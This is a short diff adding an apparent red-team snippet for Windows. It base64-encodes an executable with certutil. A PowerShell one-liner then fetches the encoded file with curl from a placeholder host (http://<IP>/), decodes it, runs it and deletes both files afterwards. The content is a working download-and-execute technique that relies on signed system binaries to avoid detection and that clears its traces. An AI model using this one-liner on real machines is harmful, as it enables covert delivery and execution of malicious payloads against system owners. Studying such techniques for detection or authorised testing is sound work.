@@ -1,0 +1,5 @@
+# Encode the binary into a text file 
+certutil -encode test.exe test.txt
+
+# Execute the binary using Microsoft Signed binaries
+Start-Process -FilePath curl -ArgumentList "http://<IP>/test.txt -o $($pwd.Path)\test.txt" -Wait; certutil -decode "$($pwd.Path)\test.txt" "$($pwd.Path)\test.exe"; Start-Process -FilePath "$($pwd.Path)\test.exe" -Wait; Remove-Item -Path "$($pwd.Path)\test.exe"; Remove-Item -Path "$($pwd.Path)\test.txt"
